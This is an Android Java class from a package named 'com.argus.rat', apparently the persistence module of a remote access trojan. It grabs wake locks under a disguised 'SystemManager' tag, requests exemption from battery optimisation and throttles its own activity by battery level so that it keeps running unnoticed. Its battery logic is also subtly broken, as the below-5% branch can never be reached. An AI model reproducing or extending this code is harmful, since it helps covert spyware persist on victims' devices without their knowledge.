package com.argus.rat;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class PowerManagement {
    private static final String TAG = "PowerManagement";
    private static PowerManagement instance;
    
    private PowerManager powerManager;
    private PowerManager.WakeLock wakeLock;
    private ScheduledExecutorService scheduler;
    private Context context;
    
    private PowerManagement(Context context) {
        this.context = context.getApplicationContext();
        this.powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
        initializePowerManagement();
    }
    
    public static synchronized PowerManagement getInstance(Context context) {
        if (instance == null) {
            instance = new PowerManagement(context);
        }
        return instance;
    }
    
    private void initializePowerManagement() {
        Log.d(TAG, "Inicializando gerenciamento de energia");
        
        // Adquirir WakeLock imediatamente
        acquireWakeLocks();
        
        // Solicitar otimização de bateria
        requestBatteryOptimizationExemption();
        
        // Agendar monitoramento periódico
        scheduleBatteryMonitoring();
    }
    
    /**
     * Adquirir WakeLocks para manter o dispositivo ativo
     */
    public void acquireWakeLocks() {
        try {
            if (powerManager == null) {
                Log.w(TAG, "PowerManager não disponível");
                return;
            }
            
            // WakeLock parcial para CPU
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK |
                PowerManager.ACQUIRE_CAUSES_WAKEUP |
                PowerManager.ON_AFTER_RELEASE,
                "SystemManager:CoreWakeLock"
            );
            
            wakeLock.acquire(3600000); // 1 hora
            Log.d(TAG, "WakeLock adquirido por 1 hora");
            
            // WakeLock adicional para tela (se necessário)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                PowerManager.WakeLock screenWakeLock = powerManager.newWakeLock(
                    PowerManager.SCREEN_DIM_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "SystemManager:ScreenWakeLock"
                );
                screenWakeLock.acquire(10000); // 10 segundos
                Log.d(TAG, "Screen WakeLock adquirido por 10 segundos");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao adquirir WakeLocks", e);
        }
    }
    
    /**
     * Solicitar isenção de otimização de bateria
     */
    public void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                if (powerManager.isIgnoringBatteryOptimizations(context.getPackageName())) {
                    Log.d(TAG, "Otimização de bateria já desativada");
                    return;
                }
                
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                
                context.startActivity(intent);
                Log.d(TAG, "Solicitação de isenção de otimização enviada");
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao solicitar isenção de otimização", e);
            }
        }
    }
    
    /**
     * Agendar monitoramento periódico da bateria
     */
    private void scheduleBatteryMonitoring() {
        scheduler.scheduleAtFixedRate(() -> {
            monitorBatteryStatus();
        }, 0, 5, TimeUnit.MINUTES); // A cada 5 minutos
        
        Log.d(TAG, "Monitoramento de bateria agendado a cada 5 minutos");
    }
    
    /**
     * Monitorar status da bateria
     */
    private void monitorBatteryStatus() {
        try {
            Intent batteryIntent = context.registerReceiver(null, 
                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                int status = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                int plugged = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
                
                float batteryPercent = (level * 100.0f) / scale;
                boolean isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                                   status == android.os.BatteryManager.BATTERY_STATUS_FULL;
                boolean isUsbCharge = plugged == android.os.BatteryManager.BATTERY_PLUGGED_USB;
                boolean isAcCharge = plugged == android.os.BatteryManager.BATTERY_PLUGGED_AC;
                
                // Log do status da bateria
                Log.i(TAG, String.format(
                    "Bateria: %.1f%% | Carregando: %s | USB: %s | AC: %s",
                    batteryPercent, isCharging, isUsbCharge, isAcCharge
                ));
                
                // Ajustar comportamento baseado no nível da bateria
                adjustBehaviorBasedOnBattery(batteryPercent, isCharging);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro no monitoramento da bateria", e);
        }
    }
    
    /**
     * Ajustar comportamento baseado no nível da bateria
     */
    private void adjustBehaviorBasedOnBattery(float batteryPercent, boolean isCharging) {
        try {
            if (batteryPercent < 15 && !isCharging) {
                // Bateria crítica - reduzir atividades
                Log.w(TAG, "Bateria crítica - reduzindo atividades");
                reduceBackgroundActivities();
            }
            else if (batteryPercent < 5 && !isCharging) {
                // Bateria extremamente baixa - parar atividades não essenciais
                Log.w(TAG, "Bateria extremamente baixa - parando atividades não essenciais");
                stopNonEssentialActivities();
            }
            else if (batteryPercent > 80 && isCharging) {
                // Bateria quase cheia e carregando - retomar atividades normais
                Log.d(TAG, "Bateria adequada - retomando atividades normais");
                resumeNormalActivities();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao ajustar comportamento baseado na bateria", e);
        }
    }
    
    /**
     * Reduzir atividades em background para economizar bateria
     */
    private void reduceBackgroundActivities() {
        try {
            // Reduzir frequência de verificações
            scheduler.shutdown();
            scheduler = Executors.newSingleThreadScheduledExecutor();
            scheduler.scheduleAtFixedRate(() -> {
                monitorBatteryStatus();
            }, 0, 15, TimeUnit.MINUTES); // A cada 15 minutos
            
            Log.d(TAG, "Atividades em background reduzidas para economizar bateria");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao reduzir atividades em background", e);
        }
    }
    
    /**
     * Parar atividades não essenciais
     */
    private void stopNonEssentialActivities() {
        try {
            // Liberar WakeLock se estiver segurando
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "WakeLock liberado devido à bateria baixa");
            }
            
            // Parar scheduler
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                Log.d(TAG, "Scheduler parado devido à bateria baixa");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao parar atividades não essenciais", e);
        }
    }
    
    /**
     * Retomar atividades normais
     */
    private void resumeNormalActivities() {
        try {
            // Re-adquirir WakeLock se necessário
            if (wakeLock == null || !wakeLock.isHeld()) {
                acquireWakeLocks();
            }
            
            // Reiniciar scheduler se estiver parado
            if (scheduler == null || scheduler.isShutdown()) {
                scheduler = Executors.newSingleThreadScheduledExecutor();
                scheduleBatteryMonitoring();
            }
            
            Log.d(TAG, "Atividades normais retomadas");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao retomar atividades normais", e);
        }
    }
    
    /**
     * Verificar se a otimização de bateria está desativada
     */
    public boolean isBatteryOptimizationDisabled() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return powerManager != null && 
                   powerManager.isIgnoringBatteryOptimizations(context.getPackageName());
        }
        return true; // Versões anteriores não têm essa restrição
    }
    
    /**
     * Verificar se o dispositivo está carregando
     */
    public boolean isDeviceCharging() {
        try {
            Intent batteryIntent = context.registerReceiver(null, 
                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            
            if (batteryIntent != null) {
                int status = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
                return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                       status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao verificar status de carregamento", e);
        }
        return false;
    }
    
    /**
     * Obter nível atual da bateria
     */
    public float getBatteryLevel() {
        try {
            Intent batteryIntent = context.registerReceiver(null, 
                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (level != -1 && scale != -1) {
                    return (level * 100.0f) / scale;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter nível da bateria", e);
        }
        return 0.0f;
    }
    
    /**
     * Liberar recursos
     */
    public void cleanup() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                Log.d(TAG, "WakeLock liberado no cleanup");
            }
            
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                Log.d(TAG, "Scheduler parado no cleanup");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro no cleanup do PowerManagement", e);
        }
    }
}